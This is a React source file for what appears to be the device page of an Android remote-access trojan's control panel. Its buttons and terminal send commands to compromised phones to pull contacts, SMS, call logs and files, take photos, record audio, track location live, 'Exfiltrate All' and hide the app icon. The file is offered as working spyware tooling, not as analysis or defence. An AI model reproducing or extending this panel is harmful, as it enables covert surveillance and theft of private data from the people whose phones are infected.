import React, { useState, useEffect, useRef } from "react";
import { useParams, useNavigate } from "react-router-dom";
import axios from "axios";
import io from "socket.io-client";
import toast from "react-hot-toast";
import {
  FiArrowLeft,
  FiCamera,
  FiMapPin,
  FiMessageSquare,
  FiPhone,
  FiUsers,
  FiFolder,
  FiBell,
  FiMic,
  FiSmartphone,
  FiBattery,
  FiGlobe,
  FiClock,
  FiSend,
  FiTrash2,
  FiRefreshCw,
  FiDownload,
  FiEye,
  FiEyeOff,
  // FiVibrate,
  FiLink,
  FiPhoneCall,
  FiFileText,
  FiCopy,
  FiWifi,
  FiShield,
  FiPower,
  FiTarget,
  FiTerminal,
} from "react-icons/fi";

const API = import.meta.env.VITE_API_URL || "http://localhost:5000";
const WS_URL = import.meta.env.VITE_WS_URL || "http://localhost:5000";

const tabs = [
  { id: "overview", label: "Overview", icon: FiSmartphone },
  { id: "contacts", label: "Contacts", icon: FiUsers },
  { id: "sms", label: "SMS", icon: FiMessageSquare },
  { id: "calls", label: "Call Logs", icon: FiPhone },
  { id: "location", label: "Location", icon: FiMapPin },
  { id: "files", label: "Files", icon: FiFolder },
  { id: "camera", label: "Camera", icon: FiCamera },
  { id: "terminal", label: "Terminal", icon: FiTerminal },
];

const quickActions = [
  { id: "get_contacts", label: "Get Contacts", icon: FiUsers, color: "blue" },
  { id: "get_sms", label: "Get SMS", icon: FiMessageSquare, color: "green" },
  {
    id: "get_call_logs",
    label: "Get Call Logs",
    icon: FiPhone,
    color: "purple",
  },
  { id: "get_location", label: "Get Location", icon: FiMapPin, color: "red" },
  { id: "take_photo", label: "Take Photo", icon: FiCamera, color: "indigo" },
  { id: "record_audio", label: "Record Audio", icon: FiMic, color: "orange" },
  {
    id: "get_device_info",
    label: "Device Info",
    icon: FiSmartphone,
    color: "cyan",
  },
  {
    id: "refresh_data",
    label: "Refresh Data",
    icon: FiRefreshCw,
    color: "teal",
  },
  {
    id: "exfiltrate_all",
    label: "Exfiltrate All",
    icon: FiDownload,
    color: "pink",
  },
];

export default function DeviceDetails() {
  const { deviceId } = useParams();
  const navigate = useNavigate();
  const [device, setDevice] = useState(null);
  const [activeTab, setActiveTab] = useState("overview");
  const [loading, setLoading] = useState(true);
  const [commands, setCommands] = useState([]);
  const [terminalInput, setTerminalInput] = useState("");
  const [terminalOutput, setTerminalOutput] = useState([]);
  const [socket, setSocket] = useState(null);
  const terminalRef = useRef(null);
  const mapRef = useRef(null);
  const [mapInitialized, setMapInitialized] = useState(false);

  useEffect(() => {
    fetchDevice();

    const s = io(WS_URL, {
      auth: { token: localStorage.getItem("token") },
    });
    setSocket(s);

    // device:data fires on basic device-info updates (device:update)
    s.on("device:data", (data) => {
      if (data.deviceId === deviceId) {
        fetchDevice();
      }
    });

    // device:data:update fires when bulk data OR a command result is saved to device.data
    s.on("device:data:update", (data) => {
      if (data.deviceId === deviceId) {
        fetchDevice();
      }
    });

    s.on("command:sent", (data) => {
      if (data.deviceId === deviceId) {
        setCommands((prev) => [data, ...prev]);
        toast.success(`Command sent: ${data.type}`);
      }
    });

    return () => s.close();
  }, [deviceId]);

  const fetchDevice = async () => {
    try {
      const token = localStorage.getItem("token");
      const res = await axios.get(`${API}/api/devices/${deviceId}`, {
        headers: { Authorization: `Bearer ${token}` },
      });
      setDevice(res.data);
      setCommands(res.data.commands?.slice(-50).reverse() || []);
    } catch (err) {
      toast.error("Failed to fetch device");
      navigate("/devices");
    } finally {
      setLoading(false);
    }
  };

  const sendCommand = (type, params = {}) => {
    if (!socket) return;
    socket.emit("command:send", { deviceId, type, params });
  };

  const sendImmediateCommand = (type, params = {}) => {
    if (!socket) return;
    socket.emit("command:send:immediate", { deviceId, type, params });
    addTerminalOutput(`> ${type} ${JSON.stringify(params)}`);
  };

  const addTerminalOutput = (text) => {
    setTerminalOutput((prev) => [
      ...prev,
      { text, time: new Date().toLocaleTimeString() },
    ]);
    setTimeout(() => {
      terminalRef.current?.scrollTo(0, terminalRef.current.scrollHeight);
    }, 100);
  };

  const handleTerminalCommand = (e) => {
    e.preventDefault();
    if (!terminalInput.trim()) return;

    let [cmd, ...args] = terminalInput.trim().split(" ");
    let params = {};

    try {
      if (args.length > 0) params = JSON.parse(args.join(" "));
    } catch {
      params = { value: args.join(" ") };
    }

    sendImmediateCommand(cmd, params);
    setTerminalInput("");
  };

  const copyToClipboard = (text) => {
    navigator.clipboard.writeText(text);
    toast.success("Copied to clipboard");
  };

  if (loading) {
    return (
      <div className="flex items-center justify-center h-96">
        <FiRefreshCw className="text-4xl text-primary-400 animate-spin" />
      </div>
    );
  }

  if (!device) return null;

  const StatusBadge = () => (
    <span
      className={`px-3 py-1.5 rounded-full text-xs font-medium flex items-center gap-2 ${
        device.status === "online"
          ? "bg-green-500/10 text-green-400 border border-green-500/20"
          : "bg-dark-600/50 text-dark-400 border border-dark-600/30"
      }`}
    >
      <span
        className={`w-2 h-2 rounded-full ${
          device.status === "online"
            ? "bg-green-400 animate-pulse"
            : "bg-dark-500"
        }`}
      />
      {device.status}
    </span>
  );

  return (
    <div className="space-y-6">
      {/* Header */}
      <div className="flex items-center justify-between">
        <div className="flex items-center gap-4">
          <button
            onClick={() => navigate("/devices")}
            className="p-2 rounded-xl hover:bg-dark-700/50 transition-all"
          >
            <FiArrowLeft className="text-xl" />
          </button>
          <div>
            <div className="flex items-center gap-3">
              <h1 className="text-2xl font-bold">
                {device.alias || device.deviceModel || "Unknown Device"}
              </h1>
              <StatusBadge />
            </div>
            <p className="text-dark-400 text-sm mt-1">
              {device.deviceId} · {device.ip}
            </p>
          </div>
        </div>
        <div className="flex items-center gap-3">
          <button
            onClick={fetchDevice}
            className="p-2 rounded-xl hover:bg-dark-700/50 transition-all"
          >
            <FiRefreshCw className="text-lg" />
          </button>
          <button
            onClick={() => sendCommand("hide_app")}
            className="p-2 rounded-xl hover:bg-dark-700/50 transition-all"
          >
            <FiEyeOff className="text-lg" />
          </button>
          <button
            onClick={() => sendCommand("unhide_app")}
            className="p-2 rounded-xl hover:bg-dark-700/50 transition-all"
          >
            <FiEye className="text-lg" />
          </button>
        </div>
      </div>

      {/* Quick Actions */}
      <div className="glass-effect rounded-2xl p-4">
        <div className="flex gap-3 overflow-x-auto pb-2">
          {quickActions.map((action) => {
            const Icon = action.icon;
            const colorMap = {
              blue: "from-blue-500 to-blue-600 border-blue-500/30",
              green: "from-green-500 to-green-600 border-green-500/30",
              purple: "from-purple-500 to-purple-600 border-purple-500/30",
              red: "from-red-500 to-red-600 border-red-500/30",
              indigo: "from-indigo-500 to-indigo-600 border-indigo-500/30",
              orange: "from-orange-500 to-orange-600 border-orange-500/30",
              cyan: "from-cyan-500 to-cyan-600 border-cyan-500/30",
              pink: "from-pink-500 to-pink-600 border-pink-500/30",
            };
            return (
              <button
                key={action.id}
                onClick={() => sendCommand(action.id)}
                className="flex-shrink-0 flex flex-col items-center gap-2 p-3 rounded-xl bg-dark-700/30 border border-dark-600/50 hover:border-primary-500/30 transition-all card-hover"
              >
                <div
                  className={`w-10 h-10 rounded-lg bg-gradient-to-br ${
                    colorMap[action.color]
                  } flex items-center justify-center`}
                >
                  <Icon className="text-white" />
                </div>
                <span className="text-xs whitespace-nowrap">
                  {action.label}
                </span>
              </button>
            );
          })}
        </div>
      </div>

      {/* Tabs */}
      <div className="flex gap-1 p-1 glass-effect rounded-xl overflow-x-auto">
        {tabs.map((tab) => {
          const Icon = tab.icon;
          return (
            <button
              key={tab.id}
              onClick={() => setActiveTab(tab.id)}
              className={`flex items-center gap-2 px-4 py-2.5 rounded-lg text-sm font-medium whitespace-nowrap transition-all ${
                activeTab === tab.id
                  ? "bg-primary-500/20 text-primary-400 border border-primary-500/30"
                  : "text-dark-400 hover:text-white hover:bg-dark-700/50"
              }`}
            >
              <Icon className="text-sm" />
              {tab.label}
            </button>
          );
        })}
      </div>

      {/* Tab Content */}
      <div className="min-h-[400px]">
        {activeTab === "overview" && (
          <div className="grid grid-cols-1 lg:grid-cols-3 gap-6">
            {/* Device Info */}
            <div className="lg:col-span-2 glass-effect rounded-2xl p-6">
              <h3 className="text-lg font-semibold mb-4">Device Information</h3>
              <div className="grid grid-cols-2 gap-4">
                {[
                  {
                    label: "Model",
                    value: `${device.manufacturer || ""} ${
                      device.deviceModel || ""
                    }`,
                  },
                  {
                    label: "OS",
                    value: `${device.os || ""} ${device.osVersion || ""}`,
                  },
                  { label: "IP Address", value: device.ip || "Unknown" },
                  { label: "Country", value: device.country || "Unknown" },
                  { label: "City", value: device.city || "Unknown" },
                  {
                    label: "Battery",
                    value:
                      device.batteryLevel != null
                        ? `${device.batteryLevel}%`
                        : "Unknown",
                  },
                  {
                    label: "First Seen",
                    value: device.firstSeen
                      ? new Date(device.firstSeen).toLocaleString()
                      : "Unknown",
                  },
                  {
                    label: "Last Seen",
                    value: device.lastSeen
                      ? new Date(device.lastSeen).toLocaleString()
                      : "Never",
                  },
                  { label: "Hidden", value: device.isHidden ? "Yes" : "No" },
                  {
                    label: "APK Version",
                    value: device.apkVersion || "Unknown",
                  },
                ].map((info) => (
                  <div
                    key={info.label}
                    className="p-3 rounded-xl bg-dark-700/30"
                  >
                    <p className="text-xs text-dark-400">{info.label}</p>
                    <p className="font-medium mt-0.5">{info.value}</p>
                  </div>
                ))}
              </div>
            </div>

            {/* Permissions */}
            <div className="glass-effect rounded-2xl p-6">
              <h3 className="text-lg font-semibold mb-4">Permissions</h3>
              <div className="space-y-3">
                {[
                  { key: "camera", label: "Camera", icon: FiCamera },
                  { key: "location", label: "Location", icon: FiMapPin },
                  { key: "sms", label: "SMS", icon: FiMessageSquare },
                  { key: "contacts", label: "Contacts", icon: FiUsers },
                  { key: "storage", label: "Storage", icon: FiFolder },
                  { key: "microphone", label: "Microphone", icon: FiMic },
                  { key: "phone", label: "Phone", icon: FiPhone },
                  {
                    key: "notifications",
                    label: "Notifications",
                    icon: FiBell,
                  },
                ].map((perm) => {
                  const Icon = perm.icon;
                  const granted = device.permissions?.[perm.key];
                  return (
                    <div
                      key={perm.key}
                      className="flex items-center justify-between p-2 rounded-lg bg-dark-700/30"
                    >
                      <div className="flex items-center gap-2">
                        <Icon
                          className={`text-sm ${
                            granted ? "text-green-400" : "text-dark-500"
                          }`}
                        />
                        <span className="text-sm">{perm.label}</span>
                      </div>
                      <span
                        className={`text-xs ${
                          granted ? "text-green-400" : "text-dark-500"
                        }`}
                      >
                        {granted ? "Granted" : "Not Available"}
                      </span>
                    </div>
                  );
                })}
              </div>
            </div>

            {/* Recent Commands */}
            <div className="lg:col-span-3 glass-effect rounded-2xl p-6">
              <h3 className="text-lg font-semibold mb-4">Recent Commands</h3>
              <div className="space-y-2 max-h-60 overflow-y-auto">
                {commands.length === 0 ? (
                  <p className="text-dark-400 text-center py-8">
                    No commands executed yet
                  </p>
                ) : (
                  commands.map((cmd, i) => (
                    <div
                      key={cmd.commandId || i}
                      className="flex items-center justify-between p-3 rounded-xl bg-dark-700/30"
                    >
                      <div className="flex items-center gap-3">
                        <span
                          className={`w-2 h-2 rounded-full ${
                            cmd.status === "executed"
                              ? "bg-green-400"
                              : cmd.status === "failed"
                              ? "bg-red-400"
                              : cmd.status === "pending"
                              ? "bg-yellow-400"
                              : "bg-dark-500"
                          }`}
                        />
                        <span className="text-sm font-medium">{cmd.type}</span>
                        <span className="text-xs text-dark-400">
                          {new Date(cmd.createdAt).toLocaleTimeString()}
                        </span>
                      </div>
                      <span className="text-xs text-dark-400">
                        {cmd.status}
                      </span>
                    </div>
                  ))
                )}
              </div>
            </div>
          </div>
        )}

        {activeTab === "contacts" && (
          <div className="glass-effect rounded-2xl p-6">
            <div className="flex items-center justify-between mb-4">
              <h3 className="text-lg font-semibold">Contacts</h3>
              <button
                onClick={() => sendCommand("get_contacts")}
                className="flex items-center gap-2 px-4 py-2 rounded-xl bg-primary-500/10 text-primary-400 border border-primary-500/30 hover:bg-primary-500/20 transition-all text-sm"
              >
                <FiRefreshCw className="text-sm" />
                Refresh
              </button>
            </div>
            {device.data?.contacts?.length > 0 ? (
              <div className="space-y-2 max-h-96 overflow-y-auto">
                {device.data.contacts.map((contact, i) => (
                  <div
                    key={contact.id || i}
                    className="flex items-center justify-between p-3 rounded-xl bg-dark-700/30 hover:bg-dark-700/50 transition-all"
                  >
                    <div>
                      <p className="font-medium">{contact.name}</p>
                      <p className="text-xs text-dark-400">
                        {contact.phones?.map((p) => p.number).join(", ")}
                      </p>
                    </div>
                    <button
                      onClick={() =>
                        copyToClipboard(JSON.stringify(contact, null, 2))
                      }
                      className="p-2 rounded-lg hover:bg-dark-600/50 transition-all text-dark-400"
                    >
                      <FiCopy className="text-sm" />
                    </button>
                  </div>
                ))}
              </div>
            ) : (
              <div className="text-center py-12 text-dark-400">
                <FiUsers className="text-4xl mx-auto mb-3 opacity-50" />
                <p>No contacts data available</p>
                <button
                  onClick={() => sendCommand("get_contacts")}
                  className="mt-4 text-sm text-primary-400 hover:text-primary-300"
                >
                  Fetch contacts now
                </button>
              </div>
            )}
          </div>
        )}

        {activeTab === "sms" && (
          <div className="glass-effect rounded-2xl p-6">
            <div className="flex items-center justify-between mb-4">
              <h3 className="text-lg font-semibold">SMS Messages</h3>
              <button
                onClick={() => sendCommand("get_sms")}
                className="flex items-center gap-2 px-4 py-2 rounded-xl bg-primary-500/10 text-primary-400 border border-primary-500/30 hover:bg-primary-500/20 transition-all text-sm"
              >
                <FiRefreshCw className="text-sm" />
                Refresh
              </button>
            </div>
            {device.data?.sms?.length > 0 ? (
              <div className="space-y-2 max-h-96 overflow-y-auto">
                {device.data.sms.map((msg, i) => (
                  <div
                    key={msg.id || i}
                    className={`p-3 rounded-xl ${
                      msg.type === "inbox"
                        ? "bg-dark-700/30"
                        : "bg-primary-500/5 border border-primary-500/10"
                    }`}
                  >
                    <div className="flex items-center justify-between">
                      <p className="font-medium text-sm">{msg.address}</p>
                      <p className="text-xs text-dark-400">
                        {new Date(msg.date).toLocaleString()}
                      </p>
                    </div>
                    <p className="text-sm text-dark-300 mt-1">{msg.body}</p>
                  </div>
                ))}
              </div>
            ) : (
              <div className="text-center py-12 text-dark-400">
                <FiMessageSquare className="text-4xl mx-auto mb-3 opacity-50" />
                <p>No SMS data available</p>
                <button
                  onClick={() => sendCommand("get_sms")}
                  className="mt-4 text-sm text-primary-400 hover:text-primary-300"
                >
                  Fetch SMS now
                </button>
              </div>
            )}
          </div>
        )}

        {activeTab === "calls" && (
          <div className="glass-effect rounded-2xl p-6">
            <div className="flex items-center justify-between mb-4">
              <h3 className="text-lg font-semibold">Call Logs</h3>
              <button
                onClick={() => sendCommand("get_call_logs")}
                className="flex items-center gap-2 px-4 py-2 rounded-xl bg-primary-500/10 text-primary-400 border border-primary-500/30 hover:bg-primary-500/20 transition-all text-sm"
              >
                <FiRefreshCw className="text-sm" />
                Refresh
              </button>
            </div>
            {device.data?.callLogs?.length > 0 ? (
              <div className="space-y-2 max-h-96 overflow-y-auto">
                {device.data.callLogs.map((call, i) => (
                  <div
                    key={call.id || i}
                    className="flex items-center justify-between p-3 rounded-xl bg-dark-700/30"
                  >
                    <div className="flex items-center gap-3">
                      <span
                        className={`w-2 h-2 rounded-full ${
                          call.type === "Incoming"
                            ? "bg-green-400"
                            : call.type === "Outgoing"
                            ? "bg-blue-400"
                            : call.type === "Missed"
                            ? "bg-red-400"
                            : "bg-yellow-400"
                        }`}
                      />
                      <div>
                        <p className="font-medium text-sm">
                          {call.name || call.number}
                        </p>
                        <p className="text-xs text-dark-400">
                          {call.type} · {call.duration}s
                        </p>
                      </div>
                    </div>
                    <p className="text-xs text-dark-400">
                      {new Date(call.date).toLocaleString()}
                    </p>
                  </div>
                ))}
              </div>
            ) : (
              <div className="text-center py-12 text-dark-400">
                <FiPhone className="text-4xl mx-auto mb-3 opacity-50" />
                <p>No call log data available</p>
                <button
                  onClick={() => sendCommand("get_call_logs")}
                  className="mt-4 text-sm text-primary-400 hover:text-primary-300"
                >
                  Fetch call logs now
                </button>
              </div>
            )}
          </div>
        )}

        {activeTab === "location" && (
          <div className="glass-effect rounded-2xl p-6">
            <div className="flex items-center justify-between mb-4">
              <h3 className="text-lg font-semibold">Location Tracking</h3>
              <div className="flex gap-2">
                <button
                  onClick={() => sendCommand("get_location")}
                  className="flex items-center gap-2 px-4 py-2 rounded-xl bg-primary-500/10 text-primary-400 border border-primary-500/30 hover:bg-primary-500/20 transition-all text-sm"
                >
                  <FiMapPin className="text-sm" />
                  Get Location
                </button>
                <button
                  onClick={() => sendCommand("continuous_location")}
                  className="flex items-center gap-2 px-4 py-2 rounded-xl bg-green-500/10 text-green-400 border border-green-500/30 hover:bg-green-500/20 transition-all text-sm"
                >
                  <FiTarget className="text-sm" />
                  Live Track
                </button>
              </div>
            </div>
            <div className="grid grid-cols-1 lg:grid-cols-3 gap-4">
              <div className="lg:col-span-2">
                <div className="h-80 rounded-xl bg-dark-700/50 flex items-center justify-center">
                  {device.data?.locations?.length > 0 ? (
                    <div className="text-center">
                      <FiMapPin className="text-4xl mx-auto mb-2 text-primary-400" />
                      <p className="text-sm">Last location:</p>
                      <p className="text-lg font-mono">
                        {device.data.locations[
                          device.data.locations.length - 1
                        ].lat?.toFixed(6)}
                        ,
                        {device.data.locations[
                          device.data.locations.length - 1
                        ].lng?.toFixed(6)}
                      </p>
                      <button
                        onClick={() =>
                          window.open(
                            `https://www.google.com/maps?q=${
                              device.data.locations[
                                device.data.locations.length - 1
                              ].lat
                            },${
                              device.data.locations[
                                device.data.locations.length - 1
                              ].lng
                            }`,
                            "_blank"
                          )
                        }
                        className="mt-2 text-sm text-primary-400 hover:text-primary-300"
                      >
                        Open in Google Maps →
                      </button>
                    </div>
                  ) : (
                    <p className="text-dark-400">No location data available</p>
                  )}
                </div>
              </div>
              <div className="space-y-3 max-h-80 overflow-y-auto">
                {device.data?.locations
                  ?.slice()
                  .reverse()
                  .map((loc, i) => (
                    <div key={i} className="p-3 rounded-xl bg-dark-700/30">
                      <p className="text-xs font-mono">
                        {loc.lat?.toFixed(4)}, {loc.lng?.toFixed(4)}
                      </p>
                      <p className="text-xs text-dark-400 mt-1">
                        {new Date(loc.timestamp).toLocaleString()}
                      </p>
                    </div>
                  ))}
              </div>
            </div>
          </div>
        )}

        {activeTab === "terminal" && (
          <div className="glass-effect rounded-2xl p-6">
            <h3 className="text-lg font-semibold mb-4">Remote Terminal</h3>

            {/* Terminal Output */}
            <div
              ref={terminalRef}
              className="h-64 bg-black rounded-xl p-4 font-mono text-sm overflow-y-auto mb-4 space-y-1"
            >
              <div className="text-green-400">
                [System] Connected to {deviceId}
              </div>
              <div className="text-dark-400">
                [System] Type 'help' for available commands
              </div>
              {terminalOutput.map((line, i) => (
                <div
                  key={i}
                  className={
                    line.text.startsWith(">")
                      ? "text-primary-400"
                      : "text-dark-200"
                  }
                >
                  <span className="text-dark-500">[{line.time}]</span>{" "}
                  {line.text}
                </div>
              ))}
            </div>

            {/* Terminal Input */}
            <form onSubmit={handleTerminalCommand} className="flex gap-3">
              <input
                type="text"
                value={terminalInput}
                onChange={(e) => setTerminalInput(e.target.value)}
                placeholder="Enter command (e.g., get_location)"
                className="flex-1 px-4 py-3 rounded-xl bg-dark-700/50 border border-dark-600/50 text-white placeholder-dark-400 focus:outline-none focus:border-primary-500/50 font-mono"
              />
              <button
                type="submit"
                className="px-6 py-3 rounded-xl bg-primary-500 text-white hover:bg-primary-600 transition-all flex items-center gap-2"
              >
                <FiSend />
                Send
              </button>
            </form>

            {/* Command Reference */}
            <div className="mt-4 grid grid-cols-2 md:grid-cols-4 gap-2">
              {[
                "get_contacts",
                "get_sms",
                "get_call_logs",
                "get_location",
                "take_photo",
                'record_audio {"action":"start"}',
                "get_installed_apps",
                "get_battery",
                "get_sim_info",
                "get_network_info",
                'vibrate {"duration":1000}',
                'open_url {"url":"https://..."}',
                "hide_app",
                "unhide_app",
                "exfiltrate_all",
                "get_device_info",
              ].map((cmd) => (
                <button
                  key={cmd}
                  onClick={() => {
                    setTerminalInput(cmd);
                  }}
                  className="text-xs p-2 rounded-lg bg-dark-700/30 hover:bg-dark-700/50 text-dark-400 hover:text-white transition-all text-left font-mono"
                >
                  {cmd}
                </button>
              ))}
            </div>
          </div>
        )}

        {/* Files Tab */}
        {activeTab === "files" && (
          <div className="glass-effect rounded-2xl p-6">
            <div className="flex items-center justify-between mb-4">
              <h3 className="text-lg font-semibold">File System</h3>
              <div className="flex gap-2">
                <button
                  onClick={() => sendCommand("get_photos")}
                  className="px-4 py-2 rounded-xl bg-dark-700/50 text-sm hover:bg-dark-700 transition-all"
                >
                  Photos
                </button>
                <button
                  onClick={() => sendCommand("get_videos")}
                  className="px-4 py-2 rounded-xl bg-dark-700/50 text-sm hover:bg-dark-700 transition-all"
                >
                  Videos
                </button>
                <button
                  onClick={() => sendCommand("get_documents")}
                  className="px-4 py-2 rounded-xl bg-dark-700/50 text-sm hover:bg-dark-700 transition-all"
                >
                  Documents
                </button>
              </div>
            </div>
            <div className="text-center py-12 text-dark-400">
              <FiFolder className="text-4xl mx-auto mb-3 opacity-50" />
              <p>Click a category button above to fetch files</p>
            </div>
          </div>
        )}

        {/* Camera Tab */}
        {activeTab === "camera" && (
          <div className="glass-effect rounded-2xl p-6">
            <h3 className="text-lg font-semibold mb-4">Camera Controls</h3>
            <div className="grid grid-cols-2 gap-4">
              <button
                onClick={() => sendCommand("take_photo")}
                className="p-8 rounded-xl bg-dark-700/30 border border-dark-600/50 hover:border-primary-500/30 transition-all card-hover text-center"
              >
                <FiCamera className="text-4xl mx-auto mb-3 text-primary-400" />
                <p className="font-medium">Take Photo</p>
                <p className="text-xs text-dark-400 mt-1">
                  Capture from front/back camera
                </p>
              </button>
              <button
                onClick={() => sendCommand("record_audio", { action: "start" })}
                className="p-8 rounded-xl bg-dark-700/30 border border-dark-600/50 hover:border-primary-500/30 transition-all card-hover text-center"
              >
                <FiMic className="text-4xl mx-auto mb-3 text-primary-400" />
                <p className="font-medium">Record Audio</p>
                <p className="text-xs text-dark-400 mt-1">
                  Start microphone recording
                </p>
              </button>
            </div>
          </div>
        )}
      </div>
    </div>
  );
}
